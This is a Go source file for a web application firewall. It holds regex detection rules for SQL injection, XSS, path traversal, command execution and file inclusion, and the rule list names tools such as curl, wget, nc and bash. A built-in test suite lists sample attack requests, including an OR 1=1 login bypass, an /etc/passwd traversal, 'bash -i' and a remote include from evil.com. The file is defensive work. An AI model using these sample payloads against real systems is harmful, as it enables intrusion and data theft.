package waf

import (
	"fmt"
	"log"
	"regexp"
	"strings"

	"github.com/Luveedu/Luveedu-Firewall/internal/config"
)

var (
	sqlInjectionPatterns = []*regexp.Regexp{
		regexp.MustCompile(`(?i)(\b(union|select|insert|update|delete|drop|alter|create|truncate)\b)`),
		regexp.MustCompile(`(?i)(\b(or|and)\b\s+\d+\s*=\s*\d+)`),
		regexp.MustCompile(`(?i)(\b(or|and)\b\s+['"]\w+['"]\s*=\s*['"]\w+['"])`),
		regexp.MustCompile(`(?i)(--|\#|\/\*)`),
		regexp.MustCompile(`(?i)(\bexec\b|\bexecute\b|\bxp_\w+\b)`),
	}

	xssPatterns = []*regexp.Regexp{
		regexp.MustCompile(`(?i)(<script[^>]*>)`),
		regexp.MustCompile(`(?i)(javascript:)`),
		regexp.MustCompile(`(?i)(on(load|error|click|mouse|focus|blur|change|submit)\s*=)`),
		regexp.MustCompile(`(?i)(<iframe[^>]*>)`),
		regexp.MustCompile(`(?i)(<object[^>]*>)`),
		regexp.MustCompile(`(?i)(<embed[^>]*>)`),
	}

	pathTraversalPatterns = []*regexp.Regexp{
		regexp.MustCompile(`(\.\.\/|\.\.\\)`),
		regexp.MustCompile(`(?i)(/etc/passwd|/etc/shadow|/proc/self)`),
		regexp.MustCompile(`(?i)(c:\\windows|c:\\boot.ini)`),
	}

	rcePatterns = []*regexp.Regexp{
		regexp.MustCompile(`(?i)(\b(cmd|exec|system|shell|eval|passthru|popen|proc_open)\s*\()`),
		regexp.MustCompile(`(?i)(wget|curl|nc|netcat|bash|sh|zsh|ksh)[-+=\s]`),
		regexp.MustCompile(`(?i)(\|\s*(cmd|exec|system|eval))`),
		regexp.MustCompile(`(?i)(\$\{.*\})`),
	}

	fileInclusionPatterns = []*regexp.Regexp{
		regexp.MustCompile(`(?i)(\b(include|require|include_once|require_once)\s*\()`),
		regexp.MustCompile(`(?i)(php:\/\/|file:\/\/|data:\/\/|expect:\/\/)`),
		regexp.MustCompile(`(?i)(\?.*=(https?|ftp):\/\/)`),
	}
)

// WAFResult holds the result of a WAF check
type WAFResult struct {
	Blocked   bool
	RuleID    string
	RuleName  string
	Pattern   string
	Request   string
	Timestamp string
}

// Initialize initializes the WAF engine
func Initialize(cfg *config.Config) error {
	if !cfg.WAF.Enabled {
		log.Printf("WAF is disabled")
		return nil
	}

	log.Printf("Initializing WAF engine...")
	log.Printf("SQL Injection protection: %v", cfg.WAF.SQLInjection)
	log.Printf("XSS protection: %v", cfg.WAF.XSS)
	log.Printf("Path Traversal protection: %v", cfg.WAF.PathTraversal)
	log.Printf("RCE protection: %v", cfg.WAF.RCE)
	log.Printf("File Inclusion protection: %v", cfg.WAF.FileInclusion)

	log.Printf("WAF engine initialized successfully")
	return nil
}

// CheckRequest checks a request against all WAF rules
func CheckRequest(request string, cfg *config.Config) *WAFResult {
	if !cfg.WAF.Enabled {
		return &WAFResult{Blocked: false}
	}

	// Check SQL Injection
	if cfg.WAF.SQLInjection {
		if result := checkSQLInjection(request); result.Blocked {
			return result
		}
	}

	// Check XSS
	if cfg.WAF.XSS {
		if result := checkXSS(request); result.Blocked {
			return result
		}
	}

	// Check Path Traversal
	if cfg.WAF.PathTraversal {
		if result := checkPathTraversal(request); result.Blocked {
			return result
		}
	}

	// Check RCE
	if cfg.WAF.RCE {
		if result := checkRCE(request); result.Blocked {
			return result
		}
	}

	// Check File Inclusion
	if cfg.WAF.FileInclusion {
		if result := checkFileInclusion(request); result.Blocked {
			return result
		}
	}

	// Check custom patterns
	for _, pattern := range cfg.WAF.BlockPatterns {
		if matched, _ := regexp.MatchString(pattern, request); matched {
			return &WAFResult{
				Blocked:  true,
				RuleID:   "CUSTOM",
				RuleName: "Custom Block Pattern",
				Pattern:  pattern,
				Request:  request,
			}
		}
	}

	return &WAFResult{Blocked: false}
}

// checkSQLInjection checks for SQL injection patterns
func checkSQLInjection(request string) *WAFResult {
	for i, pattern := range sqlInjectionPatterns {
		if pattern.MatchString(request) {
			return &WAFResult{
				Blocked:  true,
				RuleID:   fmt.Sprintf("SQLI-%03d", i+1),
				RuleName: "SQL Injection Detection",
				Pattern:  pattern.String(),
				Request:  request,
			}
		}
	}
	return &WAFResult{Blocked: false}
}

// checkXSS checks for XSS patterns
func checkXSS(request string) *WAFResult {
	for i, pattern := range xssPatterns {
		if pattern.MatchString(request) {
			return &WAFResult{
				Blocked:  true,
				RuleID:   fmt.Sprintf("XSS-%03d", i+1),
				RuleName: "XSS Detection",
				Pattern:  pattern.String(),
				Request:  request,
			}
		}
	}
	return &WAFResult{Blocked: false}
}

// checkPathTraversal checks for path traversal patterns
func checkPathTraversal(request string) *WAFResult {
	for i, pattern := range pathTraversalPatterns {
		if pattern.MatchString(request) {
			return &WAFResult{
				Blocked:  true,
				RuleID:   fmt.Sprintf("PT-%03d", i+1),
				RuleName: "Path Traversal Detection",
				Pattern:  pattern.String(),
				Request:  request,
			}
		}
	}
	return &WAFResult{Blocked: false}
}

// checkRCE checks for remote code execution patterns
func checkRCE(request string) *WAFResult {
	for i, pattern := range rcePatterns {
		if pattern.MatchString(request) {
			return &WAFResult{
				Blocked:  true,
				RuleID:   fmt.Sprintf("RCE-%03d", i+1),
				RuleName: "Remote Code Execution Detection",
				Pattern:  pattern.String(),
				Request:  request,
			}
		}
	}
	return &WAFResult{Blocked: false}
}

// checkFileInclusion checks for file inclusion patterns
func checkFileInclusion(request string) *WAFResult {
	for i, pattern := range fileInclusionPatterns {
		if pattern.MatchString(request) {
			return &WAFResult{
				Blocked:  true,
				RuleID:   fmt.Sprintf("FI-%03d", i+1),
				RuleName: "File Inclusion Detection",
				Pattern:  pattern.String(),
				Request:  request,
			}
		}
	}
	return &WAFResult{Blocked: false}
}

// RunTests runs WAF test cases to verify rules are working
func RunTests(cfg *config.Config) error {
	fmt.Println("Running WAF Rule Tests...")
	fmt.Println(strings.Repeat("=", 60))

	tests := []struct {
		name     string
		request  string
		expected bool
	}{
		// SQL Injection tests
		{"SQL Injection - UNION SELECT", "GET /page?id=1 UNION SELECT * FROM users", true},
		{"SQL Injection - OR 1=1", "GET /login?user=admin' OR 1=1--", true},
		{"SQL Injection - DROP TABLE", "GET /page?id=1; DROP TABLE users", true},
		
		// XSS tests
		{"XSS - Script Tag", "GET /page?name=<script>alert('xss')</script>", true},
		{"XSS - JavaScript URI", "GET /redirect?url=javascript:alert(1)", true},
		{"XSS - Event Handler", "GET /page?img=<img onerror=alert(1)>", true},
		
		// Path Traversal tests
		{"Path Traversal - Basic", "GET /file?path=../../../etc/passwd", true},
		{"Path Traversal - Windows", "GET /file?path=c:\\windows\\system32", true},
		
		// RCE tests
		{"RCE - System Call", "GET /cmd?exec=system('ls -la')", true},
		{"RCE - Shell Command", "GET /run?cmd=bash+-i", true},
		
		// File Inclusion tests
		{"File Inclusion - PHP Wrapper", "GET /page?file=php://filter/convert.base64-encode/resource=index.php", true},
		{"File Inclusion - Remote URL", "GET /include?url=http://evil.com/shell.php", true},
		
		// Clean requests (should not be blocked)
		{"Clean Request - Normal GET", "GET /index.html HTTP/1.1", false},
		{"Clean Request - API Call", "POST /api/users JSON", false},
	}

	passed := 0
	failed := 0

	for _, test := range tests {
		result := CheckRequest(test.request, cfg)
		
		if result.Blocked == test.expected {
			fmt.Printf("✓ PASS: %s\n", test.name)
			passed++
		} else {
			fmt.Printf("✗ FAIL: %s (expected blocked=%v, got blocked=%v)\n", 
				test.name, test.expected, result.Blocked)
			if result.Blocked {
				fmt.Printf("  Rule: %s (%s)\n", result.RuleID, result.RuleName)
			}
			failed++
		}
	}

	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("Results: %d passed, %d failed out of %d tests\n", passed, failed, len(tests))

	if failed > 0 {
		return fmt.Errorf("%d WAF tests failed", failed)
	}

	fmt.Println("\nAll WAF tests passed successfully!")
	return nil
}
